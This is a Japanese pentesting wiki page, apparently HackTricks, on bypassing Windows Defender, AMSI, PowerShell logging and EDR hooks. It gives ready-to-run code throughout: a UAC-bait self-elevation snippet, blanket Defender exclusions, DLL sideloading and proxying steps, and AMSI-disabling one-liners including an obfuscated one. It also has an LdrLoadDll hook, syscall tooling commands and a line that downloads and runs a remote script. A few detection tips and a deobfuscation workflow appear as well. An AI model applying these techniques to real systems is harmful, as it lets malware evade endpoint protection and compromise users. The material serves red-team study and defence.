# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページの初版は** [**@m2rc_p**](https://twitter.com/m2rc_p)**が執筆しました！**

## Defenderを停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderを停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを装ってWindows Defenderを停止するツール。
- [adminの場合にDefenderを無効化する](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前に、インストーラー風のUAC baitを仕掛ける

ゲームチートを装う公開ローダーは、署名のないNode.js/Nexeインストーラーとして配布されることがよくあります。まず**ユーザーに昇格を求めて**から、Defenderを無力化します。手順はシンプルです。

1. `net session`を使ってadmin権限のコンテキストかどうかを確認します。このコマンドは呼び出し元がadmin権限を持つ場合にのみ成功するため、失敗した場合、ローダーは標準ユーザーとして実行されています。
2. 元のコマンドラインを維持したまま、`RunAs` verbを使ってただちに自身を再起動し、想定どおりのUAC同意プロンプトを表示します。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「cracked」ソフトウェアをインストールしていると信じているため、通常はプロンプトに同意し、マルウェアに Defender のポリシーを変更するために必要な権限を与えます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する一律の`MpPreference`除外設定

昇格後、GachiLoader型のチェーンはサービスを完全に無効化するのではなく、Defenderの死角を最大限に広げます。ローダーはまずGUIの監視プロセス（`taskkill /F /IM SecHealthUI.exe`）を強制終了し、その後、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクがスキャンされないよう、**極めて広範な除外設定**を追加します：

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

主な観察事項:

- ループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**後からディスク上のどこに配置されたペイロードも無視されます**。
- `.sys` 拡張子の除外は将来を見越したものです。攻撃者は、後でDefenderに再度触れることなく、署名されていないドライバーを読み込める選択肢を残しています。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` の下に保存されるため、後続のステージでUACを再度起動せずに、除外が維持されていることを確認したり、除外対象を追加したりできます。

Defenderのサービスは停止されないため、単純なヘルスチェックでは「ウイルス対策は有効」と報告され続けますが、実際にはリアルタイム検査がそれらのパスを検査しません。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

現在、AVはファイルが悪意のあるものかどうかを判定するために、静的検出、動的解析、さらに高度なEDRでは振る舞い分析など、さまざまな手法を使用します。

### **Static detection**

静的検出では、バイナリやスクリプト内の既知の悪意ある文字列やバイト列を検出し、ファイル自体から情報（ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出します。そのため、既知の公開ツールを使うと検出されやすくなる場合があります。それらはすでに解析され、悪意のあるものとしてフラグ付けされている可能性が高いためです。この種の検出を回避する方法はいくつかあります。

- **暗号化**

バイナリを暗号化すれば、AVがプログラムを検出する手段はなくなりますが、メモリ上でプログラムを復号して実行する何らかのloaderが必要です。

- **難読化**

バイナリやスクリプト内の文字列をいくつか変更するだけでAVをすり抜けられる場合もありますが、難読化する対象によっては時間のかかる作業になります。

- **独自ツールの開発**

独自のツールを開発すれば、既知の悪意あるシグネチャは存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defenderの静的検出を確認する方法として、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)がおすすめです。ファイルを複数のセグメントに分割し、それぞれをDefenderにスキャンさせます。これにより、バイナリ内のどの文字列やバイトがフラグ付けされたかを正確に確認できます。

実践的なAV Evasionについては、この[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をぜひご覧ください。

### 静的分類器向けのオフラインPE特徴テスト

パックまたは暗号化されたペイロードのバイト列は、静的分類器への入力の一つにすぎません。EMBER2024は、imports、exports、sections、headers、AuthenticodeデータなどのPE特徴を抽出します。<sup>[[48]](#references)</sup> あるloaderの実験では、無害に見えるimportsを141個追加するとEMBER2024の悪意スコアが93%低下し、マルウェアに関連するimportsを追加するとスコアが上昇しました。これはそのモデルとサンプルにおける結果であり、特定のAV/EDR製品を確実に回避できることを示すものではありません。<sup>[[50]](#references)</sup>

認可されたloaderのテストでは、ペイロードと実行経路を一定に保ち、各バリアントで意図したビルド変数を一つだけ変更し、オフラインでスコアを比較してください。ビルドの変更が複数の特徴グループに影響する場合があるため、生成されたPE特徴を確認します。<sup>[[49]](#references)[[50]](#references)</sup> 意図したimportsをIATに残すには、到達可能なコードから選択したWin32 APIを呼び出します。固定のカモフラージュ関数がシグネチャ化される可能性を避けるため、選択するAPIを変え、ビルドごとに呼び出し箇所を分散させてください。この実験では、有効なコード署名、exportエントリ、`.pdata`を拡大する関数の追加でもスコアが低下しました。一方、無効な署名の影響はほとんどなく、`.pdata`による効果も小さいものでした。<sup>[[50]](#references)</sup>

`thrember`パッケージは、特徴抽出とベンチマークモデルを提供します。インストール後、既存の`models`ディレクトリを指定して`thrember.download_models("models")`を実行し、その親ディレクトリからスコアラーを実行してください。ダウンロード用ヘルパーは現在の作業ディレクトリを変更します。PE分類器を使えば、スキャンサービスに送信せずにビルドのディレクトリをスコアリングできます。<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

モデルとfeature-extractorのバージョンは比較中に固定してください。オフラインスコアが低下しても、このclassifierが変更されたバイナリにどう反応するかを示すだけであり、behavioral analysis、emulation、またはベンダーの異なるモデルを回避できた証明にはなりません。<sup>[[49]](#references)[[50]](#references)</sup> [仮想化されたpayloadにおけるビルドごとのpolymorphismと外側のバイナリのcamouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable)については、別のexecution modelを参照してください。

### **Dynamic analysis**

Dynamic analysisとは、AVがsandbox内でバイナリを実行し、悪意のある動作（ブラウザのパスワードを復号して読み取ろうとする、LSASSのminidumpを実行するなど）を監視することです。この部分は少し扱いが難しい場合がありますが、sandboxを回避するためにできることをいくつか紹介します。

- **実行前にスリープする** 実装方法によっては、AVのdynamic analysisを回避する優れた方法になります。AVがユーザーの作業を妨げないようにファイルをスキャンできる時間は非常に短いため、長時間スリープさせるとバイナリの分析を妨げられます。問題は、実装方法によっては、多くのAV sandboxがスリープをスキップできることです。
- **マシンのリソースを確認する** 通常、sandboxで使えるリソースは非常に限られています（例: RAMが2GB未満）。そうでなければ、ユーザーのマシンの動作が遅くなる可能性があります。CPUの温度やファンの回転数を確認するなど、工夫の余地はあります。sandboxには実装されていない機能もあるでしょう。
- **マシン固有のチェック** 「contoso.local」ドメインに参加しているユーザーのワークステーションを標的にする場合、コンピューターのドメインが指定したものと一致するか確認し、一致しなければプログラムを終了させることができます。

Microsoft DefenderのSandboxのコンピューター名はHAL9THであることがわかっています。そのため、detonation前にmalware内でコンピューター名を確認できます。名前がHAL9THならDefenderのsandbox内にいることを意味するので、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxに対抗するための、[@mgeeky](https://twitter.com/mariuszbit)によるその他の優れたヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この記事で前述したように、**public tools**は最終的に**検知されます**。そこで、次のことを考えてみてください。

たとえば、LSASSをdumpしたい場合、**本当にmimikatzを使う必要がありますか**？それとも、あまり知られておらず、LSASSもdumpできる別のプロジェクトを使えますか？

おそらく後者が正解です。mimikatzを例にすると、AVやEDRに最も多く検知されるmalwareの一つ、あるいは最も検知されるものと言ってもよいでしょう。プロジェクト自体は非常に優れていますが、AVを回避するために使うのは非常に厄介です。実現したいことに対する代替手段を探しましょう。

> [!TIP]
> evasionのためにpayloadを変更する際は、Defenderの**automatic sample submissionをオフ**にしてください。また、長期的にevasionを実現することが目的なら、**絶対にVIRUSTOTALにアップロードしないでください**。特定のAVにpayloadが検知されるか確認したい場合は、VMにインストールし、automatic sample submissionをオフにして、結果に納得するまでそこでテストしてください。

## EXEs vs DLLs

可能であれば、evasionには常に**DLLを優先して使用**してください。私の経験では、DLLファイルは通常、**検知や分析を受ける可能性がはるかに低い**ため、場合によっては検知を避けるためのとても簡単な方法になります（もちろん、payloadをDLLとして実行する方法がある場合に限ります）。

この画像のとおり、HavocのDLL Payloadはantiscan.meで検知率が4/26であるのに対し、EXE payloadの検知率は7/26です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常のHavoc EXE payloadと通常のHavoc DLLのantiscan.meでの比較</p></figcaption></figure>

ここからは、DLLファイルを使ってさらにステルス性を高めるためのテクニックをいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading**は、victim applicationと悪意のあるpayloadを並べて配置することで、loaderが使用するDLLの検索順序を悪用します。

[ Siofra ](https://github.com/Cybereason/siofra)と次のpowershell scriptを使って、DLL Sideloadingの影響を受けやすいプログラムを調べることができます。

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、`"C:\Program Files\\"` 内で DLL hijacking の影響を受けるプログラムと、それらが読み込もうとする DLL ファイルの一覧を出力します。

**DLL Hijackable/Sideloadable programs** を自分で調べることを強くおすすめします。この手法は適切に実行すればかなりステルス性が高いですが、公知の DLL Sideloadable programs を使うと、簡単に検知される可能性があります。

プログラムが読み込むことを想定している名前の悪意ある DLL を配置するだけでは、payload は読み込まれません。プログラムは、その DLL 内に特定の関数があることを想定しているからです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の手法を使います。

**DLL Proxying** は、プログラムからプロキシ（悪意ある）DLL への呼び出しを元の DLL に転送します。これにより、プログラムの機能を維持しながら、payload の実行にも対応できます。

[@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを使用します。

以下が実行した手順です。

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドで、2つのファイルが生成されます。DLLソースコードのテンプレートと、リネームされた元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

これらが結果です。

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのshellcode（[SGN](https://github.com/EgeBalci/sgn)でエンコード）とproxy DLLは、どちらも[antiscan.me](https://antiscan.me)でDetection rateが0/26でした！これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについては、[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)もぜひ視聴して、ここで説明した内容をさらに詳しく学ぶことを**強くおすすめ**します。

### Forwarded Exportsの悪用（ForwardSideLoading）

Windows PEモジュールは、実際には「forwarder」である関数をexportできます。コードを指す代わりに、exportエントリには`TargetDll.TargetFunc`形式のASCII文字列が含まれます。呼び出し元がそのexportを解決すると、Windows loaderは次の処理を行います。

- `TargetDll`がまだロードされていない場合はロードする
- そこから`TargetFunc`を解決する

理解しておくべき主な挙動:
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs namespace（例: ntdll、kernelbase、ole32）から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合、通常のDLL search orderが使われます。これには、forward解決を行うモジュールのディレクトリも含まれます。

これにより、間接的なsideloading primitiveが可能になります。つまり、KnownDLLではないモジュール名にforwardされる関数をexportする署名済みDLLを見つけ、その署名済みDLLと同じ場所に、forward先のモジュールとまったく同じ名前を付けた攻撃者制御のDLLを配置します。forwarded exportが呼び出されると、loaderはforwardを解決し、同じディレクトリから攻撃者のDLLをロードして、DllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。コード実行には最小限の DllMain で十分です。DllMain を実行させるために、転送関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みLOLBinで転送をトリガーする：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

観察された動作:
- rundll32 (署名済み) が side-by-side の `keyiso.dll` (署名済み) を読み込む
- `KeyIsoSetAuditingInterface` の解決時、loader は forward をたどって `NCRYPTPROV.SetAuditingInterface` に進む
- その後、loader は `C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、「missing API」エラーが発生するのは、すでに `DllMain` が実行された後

探索のヒント:
- 転送先のモジュールが KnownDLL ではない forwarded exports に注目してください。KnownDLL の一覧は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` にあります。
- 次のようなツールを使って forwarded exports を列挙できます:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 forwarder inventory を参照してください: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知・防御のアイデア:
- LOLBins（例: rundll32.exe）がシステム以外のパスから署名済みDLLを読み込み、その後、同じディレクトリから同じベース名を持つ非KnownDLLsを読み込む動作を監視する
- 次のようなプロセス／モジュールの連鎖を検知する: ユーザーが書き込み可能なパスにある `rundll32.exe` → システム以外の `keyiso.dll` → `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込みと実行を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freezeは、一時停止したプロセス、直接syscall、代替実行方法を利用してEDRをバイパスするためのpayload toolkitです`

Freezeを使うと、ステルス性を保ちながらshellcodeを読み込んで実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはいたちごっこのようなもので、今日有効な手法が明日には検出される可能性があります。そのため、1つのツールだけに頼らず、可能であれば複数のevasion techniquesを組み合わせてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRは、`ntdll.dll`のsyscall stubに**user-mode inline hooks**を設定することがよくあります。これらのhookを回避するには、正しい**SSN**（System Service Number）をロードし、hookされたexportのentrypointを実行せずにkernel modeへ移行する**direct**または**indirect** syscall stubを生成します。<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: 生成されたstubに`syscall`/`sysenter`/`SVC #0`命令を出力します（`ntdll`のexportにはヒットしません）。
- **Indirect**: `ntdll`内の既存の`syscall` gadgetにジャンプすることで、kernelへの移行が`ntdll`から発生したように見せます（heuristic evasionに有用）。**randomized indirect**では、呼び出しごとにpoolからgadgetを選択します。
- **Egg-hunt**: ディスク上に静的な`0F 05` opcode sequenceを埋め込まず、runtimeにsyscall sequenceを解決します。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stubのbytesを読み取る代わりに、syscall stubをvirtual address順に並べてSSNを推測します。
- **SyscallsFromDisk**: クリーンな`\KnownDlls\ntdll.dll`をmapし、その`.text`からSSNを読み取ってからunmapします（メモリ内のすべてのhookを回避します）。
- **RecycledGate**: VA順のSSN推測とopcode validationを組み合わせ、stubがクリーンな場合に使用します。hookされている場合はVA推測にfallbackします。
- **HW Breakpoint**: `syscall`命令にDR0を設定し、VEHを使ってruntimeに`EAX`からSSNを取得します。hookされたbytesを解析する必要はありません。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVがスキャンできるのは**ディスク上のファイル**だけでした。そのため、ペイロードを何らかの方法で**メモリ上で直接**実行できれば、AVはそれを検知するための十分な可視性を持たず、阻止できませんでした。

AMSI機能は、Windowsの以下のコンポーネントに統合されています。

- ユーザーアカウント制御（UAC。EXE、COM、MSIの昇格、またはActiveXのインストール）
- PowerShell（スクリプト、対話的な使用、動的なコード評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

これにより、スクリプトの内容を暗号化も難読化もされていない形式で公開し、ウイルス対策ソリューションがスクリプトの動作を検査できるようになります。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続いて、スクリプトを実行した実行ファイルのパスが付加されていることに注目してください。この場合はpowershell.exeです。

ディスク上にファイルを作成していませんが、AMSIによってメモリ上で検知されました。

さらに、**.NET 4.8**以降では、C#コードもAMSIを通して実行されます。これは、インメモリ実行のために`Assembly.Load(byte[])`を使って読み込む場合にも影響します。そのため、AMSIを回避してインメモリ実行するには、.NETの低いバージョン（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **難読化**

AMSIは主に静的検知を行うため、読み込もうとするスクリプトを変更することは、検知を回避する有効な方法になり得ます。

ただし、AMSIは複数の層があってもスクリプトを難読化解除できるため、難読化の方法によっては有効な選択肢にならないことがあります。そのため、回避は単純ではありません。一方で、変数名をいくつか変えるだけで十分な場合もあるため、どの程度フラグが付けられているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（cscript.exe、wscript.exeなど）のプロセスに読み込むことで実装されているため、非特権ユーザーとして実行していても簡単に改変できます。AMSIの実装上のこの欠陥を受けて、研究者たちはAMSIスキャンを回避する複数の方法を発見しました。

**エラーを強制する**

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されなくなります。この手法は当初、[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftは広く利用されるのを防ぐためのシグネチャを開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShellコードを1行実行するだけで、現在のPowerShellプロセスでAMSIを使用不能にできました。もちろん、この行自体がAMSIによって検知されるため、この手法を使うには何らかの変更が必要です。

以下は、[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から引用した、改変版のAMSI bypassです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, この投稿が公開されるとおそらく検知されるため、検知を回避し続けるつもりなら、コードは公開しないでください。

**Memory Patching**

この手法は当初 [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。ユーザー入力のスキャンを担う amsi.dll 内の「AmsiScanBuffer」関数のアドレスを特定し、E_INVALIDARG のコードを返す命令で上書きします。これにより、実際のスキャン結果は 0 を返し、クリーンな結果として解釈されます。

> [!TIP]
> 詳しい説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

powershell で AMSI をバイパスする手法はほかにも数多くあります。詳しくは[**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**この repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)を参照してください。

### `AmsiScanBuffer` のパッチではなく、AMSI COM の scan-pointer をリダイレクトする方法

別のプロセス内バイパスでは、`AmsiScanBuffer` のエントリポイントを変更しません。報告されている 64-bit .NET loader では、CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` から AMSI COM object を作成し、`Marshal.GetIUnknownForObject()` で interface pointer を取得します。さらに、その vtable のオフセット `0x18` にあるスロットを scan 呼び出し先として使用します。loader は `Console.Clear()` の native pointer を小さな x64 stub でパッチし、`VirtualProtect()` を使って vtable エントリを stub に変更した後、元のページ保護を復元します。前提条件として、64-bit pointer width と想定される COM layout の両方が必要です。これは、任意の AMSI interface や build に適用できる汎用的なオフセットではありません。先に観測された段階は、[signed AppDomainManager sidecar loading](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) と [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml) です。<sup>[[51]](#references)</sup>

観測された stub bytes は `41 C7 00 01 00 00 00 33 C0 C3` です。このバイト列は、`r8` の result pointer が指す先に **1** を書き込み、`eax` に **0** を返します。したがって、スキャン結果が `AMSI_RESULT_CLEAN` (0) であるという報告は、`S_OK` の戻り値と出力 enum を混同しています。ドキュメントに記載された `AMSI_RESULT` の順序では、結果の **1** は `AMSI_RESULT_NOT_DETECTED` です。これは引き続き検出しきい値を下回っています。<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll の読み込みを防止して AMSI をブロックする（LdrLoadDll hook）

AMSI は、現在のプロセスに `amsi.dll` が読み込まれた後にのみ初期化されます。堅牢で言語に依存しないバイパス方法は、`ntdll!LdrLoadDll` に user-mode hook を設定し、要求されたモジュールが `amsi.dll` の場合にエラーを返すことです。その結果、AMSI は読み込まれず、そのプロセスではスキャンが行われません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ 疑似コード）:
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意事項
- PowerShell、WScript/CScript、カスタム loader のいずれでも機能します（通常なら AMSI を読み込むものすべて）。
- 長いコマンドラインの痕跡を避けるには、スクリプトを stdin 経由で渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせてください。
- `DllRegisterServer` を呼び出す `regsvr32` などの LOLBins 経由で実行される loader による使用例が確認されています。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** も、AMSI をバイパスするスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** も、ランダム化されたユーザー定義関数、変数、文字式を使って signature を回避し、PowerShell キーワードの大文字・小文字をランダムにして signature を回避するスクリプトを生成します。

**検知された signature を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などのツールを使って、現在のプロセスのメモリから検知された AMSI signature を削除できます。このツールは、現在のプロセスのメモリをスキャンして AMSI signature を探し、NOP 命令で上書きすることで、メモリから実質的に削除します。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**Powershell version 2 を使用する**
PowerShell version 2 では AMSI が読み込まれないため、AMSI にスキャンされずにスクリプトを実行できます。次のように実行できます:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検出を回避したい攻撃者にとっては問題となる可能性があります**。

PowerShell loggingを回避するには、次の手法を使用できます。

- **PowerShell TranscriptionとModule Loggingを無効にする**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)などのツールを使用できます。
- **PowerShell version 2を使用する**: PowerShell version 2ではAMSIが読み込まれないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **unmanaged PowerShell sessionを使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)を使用すると、`powershell.exe`を起動せずにPowerShellをホストできます（Cobalt Strikeの`powerpick`で使用されている手法）。これにより、`powershell.exe`プロセスに特化した制御は回避できます。ただし、AMSI、Script Block Logging、その他すべてのPowerShell防御が自動的に無効になるわけではありません。防御の適用範囲は、runtimeとhostの実装によって異なります。


## Obfuscation

> [!TIP]
> 複数のobfuscation手法ではデータの暗号化が行われるため、binaryのentropyが増加し、AVやEDRによる検出が容易になる可能性があります。この点に注意し、暗号化は機密性が高い、または隠す必要があるコードの特定のセクションにのみ適用することを検討してください。

### ConfuserExで保護された.NET BinaryのDeobfuscation

ConfuserEx 2（または商用fork）を使用したmalwareを解析する際には、decompilerやsandboxを妨げる複数の保護レイヤーに直面することがよくあります。以下のワークフローを使用すると、ほぼ**元のILを確実に復元**でき、その後dnSpyやILSpyなどのツールでC#にdecompileできます。<sup>[[10]](#references)</sup>

1.  Anti-tamperingの除去 – ConfuserExはすべての*method body*を暗号化し、`<Module>.cctor`のstatic constructor内で復号します。また、PE checksumにもパッチを適用するため、変更を加えるとbinaryがクラッシュします。**AntiTamperKiller**を使用して暗号化されたmetadata tableを特定し、XOR keyを復元して、クリーンなassemblyを書き出します:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   出力には、独自のunpackerを作成する際に役立つ6つのanti-tamperパラメータ（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル／control-flowの復元 – *clean*ファイルを**de4dot-cex**（ConfuserExに対応したde4dotのfork）に渡します。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profileを選択
     • de4dotはcontrol-flow flatteningを元に戻し、元のnamespace、class、variable nameを復元して、constant stringを復号します。

